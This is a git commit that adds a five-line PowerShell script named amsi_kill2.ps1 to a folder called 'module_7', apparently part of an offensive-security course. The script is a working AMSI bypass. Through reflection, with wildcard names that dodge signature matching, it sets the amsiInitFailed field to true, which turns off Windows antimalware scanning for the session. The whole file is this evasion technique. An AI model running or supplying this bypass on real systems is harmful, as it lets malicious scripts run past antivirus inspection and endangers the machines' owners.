f63f778967d68575cea23c920d34cb3f0dd78c3f
Emmanouil Perselis <okmanolos1@hotmail.com>
2020-12-09 20:35:41 +0100

    Create amsi_kill2.ps1

---
+++ module_7/amsi_kill2.ps1
@@ -0,0 +1,5 @@
+$a=[Ref].Assembly.GetTypes()
+Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}
+$d=$c.GetFields('NonPublic,Static')
+Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}}
+$g=$f.SetValue($null,$true)
